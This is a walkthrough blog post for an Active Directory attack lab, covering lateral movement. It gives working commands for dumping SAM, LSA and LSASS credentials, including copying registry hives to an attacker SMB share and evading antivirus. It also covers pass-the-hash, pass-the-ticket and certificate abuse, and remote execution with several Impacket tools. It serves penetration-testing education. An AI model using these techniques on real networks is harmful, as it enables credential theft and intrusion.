---
layout: post
title:  "GOAD - part 9 - Lateral move"
category : AD
tags :  AD, Lab, Impacket, Lateral move
---

In the previous post ([Goad pwning part8]({% link _posts/2022-09-25-GOADv2-pwning-part8.md %})) we tried some privilege escalation techniques. Today we will talk about lateral move.
Lateral move append when you already pwned a computer and you move from this computer to another.

## Give me your secrets

- Before jumping from computer to computer we must get the secrets of the owned machine.
- Windows got a lot of different secrets stored in different place.

- Let's launch impacket secretsdump.py and see what we got :

```bash
❯ python3 secretsdump.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 
Impacket v0.10.1.dev1+20220912.232454.86a5cbf8 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9753797dfb54be86486d950690bac8ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0e181c6215bdbfd5b93917da349fc7cd:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[*] Dumping cached domain logon information (domain/username:hash)
NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a
NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405
NORTH.SEVENKINGDOMS.LOCAL/Administrator:$DCC2$10240#Administrator#afb576755bfd2762f808e2e91eb83eb3
NORTH.SEVENKINGDOMS.LOCAL/jon.snow:$DCC2$10240#jon.snow#82fdcc982f02b389a002732efaca9dc5
NORTH.SEVENKINGDOMS.LOCAL/jeor.mormont:$DCC2$10240#jeor.mormont#36d673a934e86d04ece208fc2ba1d402
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:69c32491ad552dc341b9f989daeb91243031a3267708f424461f5134fd6275f5
NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:0cc49644dd699c02fb34b6ff81a86f8a
NORTH\CASTELBLACK$:des-cbc-md5:3b4fa8679e7f738a
NORTH\CASTELBLACK$:plain_password_hex:9257eeecf6e89023aefa9cc72aab5e0840541b0a494fb5dd90da4244525d3ff3dd237022108f1d811eaf1588cb96a26b9f9ff01326a300893436819216565d07d9ab02a5feb2223d80db9881e4cafdcc939bcbd8b404cfd8ef4f199c233e6adc22963de84bfb172b4ed8afd798c0589ae5c0e304965784e5785cd1fcbccfe30c9b01828d2f10e6fc758eba3be36ec9f5f84bf4e8606bfedbfcfd4700142884277862817141ba9b41d5e9cb4aad33f1153e9e6d166af5077d0ceec54e97614e48b09575732db2053b5da17844015aac0a83d4f3e82d33f0f626f41634e0d445bb80396edf4398b07a1e1644b301665c5f
NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:22d57aa0196b9e885130414dc88d1a95:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8ee2a1f0f4c1689343c9d954b1422661262a52a3
dpapi_userkey:0xad6d3e6789682c3429236b14411f92f406792486
[*] NL$KM 
 0000   39 FB 46 D8 43 B6 EC E6  DE D7 CE 1C 50 2D AE B4   9.F.C.......P-..
 0010   4F 71 E1 25 BF 5E FB 14  86 14 D6 A3 0F 93 DE 42   Oq.%.^.........B
 0020   06 48 F4 35 B1 45 83 7E  1A 98 29 D6 45 19 14 D2   .H.5.E.~..).E...
 0030   C4 66 57 03 2B C5 04 01  AE 33 49 CD D2 E0 92 CE   .fW.+....3I.....
NL$KM:39fb46d843b6ece6ded7ce1c502daeb44f71e125bf5efb148614d6a30f93de420648f435b145837e1a9829d6451914d2c46657032bc50401ae3349cdd2e092ce
[*] _SC_MSSQL$SQLEXPRESS 
north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

## Security Account Manager (SAM) Database

- First secretdump retreive the SAM hashes :

```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0e181c6215bdbfd5b93917da349fc7cd:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

- Let's talk about the sam database.
- The Security Account Manager (SAM) is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer.
- The sam database is located at : C:\Windows\System32\config\SAM and is mounted on registry at HKLM/SAM
- To be able to decrypt the data you need the contains of the system file located at C:\Windows\System32\config\SYSTEM  and is available on the registry at HKLM/SYSTEM.
- SecretDump get the contains of HKLM/SAM and HKLM/SYSTEM and decrypt the contains.

- We dumped the sam database with secretsdump but we can also do that with the following commands :
```bash
smbserver.py -smb2support share .  # start a server to get the result
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SAM' -o '\\192.168.56.1\share'
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
```

- Or directly on our windows shell:
```cmd
reg save HKLM\SAM c:\sam
reg save HKLM\SYSTEM c:\system
```

>With SAM and SYSTEM we get the contains of the LM and NT hashs stored in the sam database.
{: .prompt-tip }

>The SAM database contains all the local accounts
{: .prompt-info }

- secretsdump got a command to decrypt the sam contains with the files we download :

```bash
secretsdump -sam SAM.save -system SYSTEM.save LOCAL
```

![lateral_hashdump.png](/assets/blog/GOAD/lateral_hashdump.png)

- The result is in the following format:

```
<Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:
```

- In our result we have :

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
user: Administrator
RID : 500
LM hash : aad3b435b51404eeaad3b435b51404ee (this hash value means empty)
NT hash : dbd13e1c4e338284ac4e9874f7de6ef4 (this is the important result here)
```

- Wes have the NT hash of the administrator account, so we could try lateral move with it !

### Password reuse and PTH attack

- On a pentest when you compromised a first target on an active directory system you should always try if the local accounts are the same on all the servers.
- Almost all the time when clients are not mature in security they duplicate the same image to build all servers. By doing this, they also replicate the same administrator account and password.
- By doing so there is password reuse everywhere in the network (if you want to avoid that you should use laps)
- One of the best way to abuse the password reuse is by using a Pass The Hash (PTH) attack in all the network with CrackMapExec.

```bash
cme smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
```

![lateral_pth_local.png](/assets/blog/GOAD/lateral_pth_local.png)

- Here we can see there is no password reuse between castelblack and others servers.

- But when a computer is promote to a domain controler the local administrator password is then used as the domain administrator password, so a test we could do is trying the password reuse between our administrator local account and the domain controler administrator account.

```bash
cme smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
```

![lateral_pth_domain.png](/assets/blog/GOAD/lateral_pth_domain.png)

- As we can see the local administrator password NT hash we extracted from castelblack's sam database is the same as the north.sevenkingdoms.local administrator NT hash.

- Here the password reuse between castelblack and winterfell give us the domain administrator power on the north domain. 

> LM/NT/NTLM/NetNTLMv1/NetNTLMv2 what's the difference ? <br>
> There is a lot of confusion between the hash names and this could be very disturbing for people when they begin in the active directory exploitation.
> - LM : old format turned off by default starting in Windows Vista/Server 2008
> - NT (a.k.a NTLM) : location SAM & NTDS : This one is use for pass the hash (i still often use the generic term ntlm to call this, sry) 
> - NTLMv1 (a.k.a NetNTLMv1) : Used in challenge/response between client and server -> can be cracked or used to relay NTLM
> - NTLMv2 (a.k.a NetNTLMv2) : Same as NetNTLMv1 but improved and harder to crack   -> can be cracked or used to relay NTLM
{: .prompt-info }

## LSA (Local Security Authority) secrets And Cached domain logon information

- When your computer is enrolled on a windows active directory you can logon with the domain credentials.
- But when the domain is unreachable you still can use your credentials even if the domain controler is unreachable.
- This is due to the cached domain logon information who keep the credentials to verify your identity.
- This is stored on C:\Windows\System32\config\SECURITY (available on HKLM\SECURITY)
- Just like for the sam database you will need the system file located at C:\Windows\System32\config\SYSTEM  and is available on the registry at HKLM/SYSTEM.

```bash
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\share'
```

- And extract the contain offline

```bash
secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
```

![lateral_lsa_secrets_and_cache.png](/assets/blog/GOAD/lateral_lsa_secrets_and_cache.png)


- This give us multiple interreseting information :

- Cached domain credentials : example : `NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405`
  - This give us a DCC2 (Domain Cached credentials 2 ) hash (hashcat mode 2100). 
  - This hash can NOT be used for PTH and must be cracked.
  - That kind of hash is very strong and long to break, so unless the password is very weak it will take an eternity to crack.

- Machine account : example here : $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:22d57aa0196b9e885130414dc88d1a95
  - This contains the NT hash of the machine account, here it is 22d57aa0196b9e885130414dc88d1a95

>Remember a machine account is a valid account on the domain. <br>
> The machine account (here `castelblack$` ) + the hash NT we just retreive can be use to query the ldap.
{: .prompt-tip }

- Service account credentials : example here : 

```
  [*] _SC_MSSQL$SQLEXPRESS
(Unknown User):YouWillNotKerboroast1ngMeeeeee
```

- This is the sql_svc account register on castelBraavos computer.

- There is also the master DPAPI key and the password for autologon

### LSA secrets -> Lateral move

- In order to process to a lateral move with LSA secrets we could :
  - Crack DCC2 hashes to gain a domain account
  - Use the machine account to query the ldap, and find over ways to exploit with ACL (Just like the user account)
  - Use the service account stored credentials we just retreive.

- A classic example could be to launch bloudhound.py with the computer account.

![lateral_bloodhound_py_with_computer_hash.png](/assets/blog/GOAD/lateral_bloodhound_py_with_computer_hash.png)


## LSASS (Local Security Authority Subsystem Service)

- Another important secret keeper in windows Active directory is the LSASS.exe process.
- By running tools like mimikatz it is possible to dump the contains of the LSASS process.
- A tool is particulary usefull in lateral move + lsass dump remotely : [lsassy](https://github.com/Hackndo/lsassy)
- This tool combine multiple technics to dump lsass remotely on multiple computer.

> Dumping LSASS almost always ring a red alert on the anti-virus of the target computer.<br>
> You will need to use AV bypass technics to be able to dump the lsass.exe process.
{: .prompt-warning }

- We will use lsassy combined with the [dumpert](https://github.com/outflanknl/Dumpert) module (you will have to compile dumpert first to get the dll file).

```bash
lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll
```

![lateral_lsassy_dumpert.png](/assets/blog/GOAD/lateral_lsassy_dumpert.png)

> The defender av is trigged with dumpert out of the box, but lsassy still get the time to retreive the dump informations.
{: .prompt-info }

- We then find out domain NTLM hash and TGT from the Lsass process

- Now imagine a privileged user launch a connection to castelblack

```bash
xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:castelblack.north.sevenkingdoms.local /cert-ignore
```

- We relaunch the dump and now we can see we have the catelyn.stark ntlm hash and kirbi file in the results

![lateral_lsassy_dumpert_catelyn.png](/assets/blog/GOAD/lateral_lsassy_dumpert_catelyn.png)


### LSASS dump -> domain users NTLM or aesKey -> lateral move (PTH and PTK)

- Before jumping into some lateral move technics i recommend you to read the following articles about the usual technics implemented in impacket : 
  - [https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html](https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html)
  - [https://neil-fox.github.io/Impacket-usage-&-detection/](https://neil-fox.github.io/Impacket-usage-&-detection/)

- With impacket we could use : 
  - PTH : -hashes <NTLM>
  - PTK : -key <aes128 or 256 key>

### Lateral Move with impacket

#### PsExec

- PsExec:
  - upload executable
  - create a service to run the executable
  - Communicate with the service with namedPipe.
  - Protocol : SMB

```
psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

> PsExec is flagged out of the box by defender and can no longer be used with the RemCom service binary embeded with impacket without raising an alert and fail.
{: .prompt-warning }

> Impacket give an option to change the service used by psexec with the -file option
{: .prompt-tip }

- By creating a custom psexec service you can bypass the defender av and get a shell

![lateral_custom_psexec.png](/assets/blog/GOAD/lateral_custom_psexec.png)

![lateral_custom_psexec_wireshark.png](/assets/blog/GOAD/lateral_custom_psexec_wireshark.png)

#### WmiExec

WmiExec (pseudo-shell):
 - Create new process throught wmi
 - Create file to get the command result, read the file with smb and delete it
 - Protocols : DCERPC + SMB

```bash
wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

![lateral_wmi_exec.png](/assets/blog/GOAD/lateral_wmi_exec.png)

![lateral_wmiexec_wireshark.png](/assets/blog/GOAD/lateral_wmiexec_wireshark.png)

#### SmbExec

SmbExec (pseudo-shell):
  - Don't upload executable
  - Create a service on every request
  - Get the command results on a share or on a server controled by the attacker (with -mode SERVER)
  - Protocol SMB

```bash
smbexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

![lateral_smbexec.png](/assets/blog/GOAD/lateral_smbexec.png)

![lateral_smbexec_wireshark.png](/assets/blog/GOAD/lateral_smbexec_wireshark.png)

#### AtExec

AtExec (execute command):
  - use a schedule task to run the command
  - protocol SMB

```bash
atexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

![lateral_atexec.png](/assets/blog/GOAD/lateral_atexec.png)

![lateral_atexec_wireshark.png](/assets/blog/GOAD/lateral_atexec_wireshark.png)

#### DcomExec
DecomExec (Distributed Component Object Model):
  - pseudo shell (get the result in files retreived with smb)
  - protocol DCERPC + SMB

```bash
dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

![lateral_dcomexec.png](/assets/blog/GOAD/lateral_dcomexec.png)

![lateral_dcomexec_turnofffirewall.png](/assets/blog/GOAD/lateral_dcomexec_turnofffirewall.png)

![lateral_dcomexec_wireshark.png](/assets/blog/GOAD/lateral_dcomexec_wireshark.png)

### Lateral Move with CME

```bash
cme smb 192.168.56.11 -H ':cba36eccfd9d949c73bc73715364aff5' -d 'north' -u 'catelyn.stark' -x whoami
```

- By default cme only check if smb admin$ is writable. If it is the case cme show "pwned".
- For execution cme use the -x option and by default use the wmiexec impacket method

![lateral_cme.png](/assets/blog/GOAD/lateral_cme.png)

### Using winrm

- Winrm
  - protocol HTTP or HTTPS

```bash
evil-winrm -i 192.168.56.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'
```

![lateral_winrm.png](/assets/blog/GOAD/lateral_winrm.png)

![lateral_evilwinrm_wireshark.png](/assets/blog/GOAD/lateral_evilwinrm_wireshark.png)

### Using RDP

- If you try to do PTH with RDP :

```bash
xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:192.168.56.11
```

- You will have the following error :

![lateral_rdp_restriction.png](/assets/blog/GOAD/lateral_rdp_restriction.png)

>To allow rdp connection without password you must Enable restricted admin
{: .prompt-tip }

- Enable restricted admin:

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

- Let's do this from linux, first let's show the current value :

```bash
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' 
```

![lateral_rdp_query_disable_restricted_admin.png](/assets/blog/GOAD/lateral_rdp_query_disable_restricted_admin.png)

- The value doesn't exist we create it :

```bash
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```

- Now try again rdp connection and it works \o/

![lateral_rdp_work.png](/assets/blog/GOAD/lateral_rdp_work.png)

- Once finished delete the created registry key

```bash
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'
```

## TGT

### Over Pass the Hash (NT -> TGT -> authentication)

- Get a kerberos ticket from the nt hash

```bash
getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
```

### Pass the ticket

- Now we got the TGT of catelyn we will use it

```bash
export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
```

![lateral_hash_to_tgt.png](/assets/blog/GOAD/lateral_hash_to_tgt.png)

- You could also use the tickets dumped with lsassy using impacket ticketConverter:

```bash
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```

![lateral_ptt.png](/assets/blog/GOAD/lateral_ptt.png)

## Certificate

### Pass The Certificate (Cert -> NTLM or TGT)

- Back in our ESC1 case we request a certificate 

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```

- With certipy we can request the ntlm hash of the user and the TGT too

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

![lateral_certificate.png](/assets/blog/GOAD/lateral_certificate.png)

## References

- [https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html](https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html)
- [https://neil-fox.github.io/Impacket-usage-&-detection/](https://neil-fox.github.io/Impacket-usage-&-detection/)
- [https://www.ired.team/offensive-security/lateral-movement](https://www.ired.team/offensive-security/lateral-movement)
- [https://www.thehacker.recipes/ad/movement](https://www.thehacker.recipes/ad/movement)
- [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/)
- ...

Next time we will have fun with kerberos delegation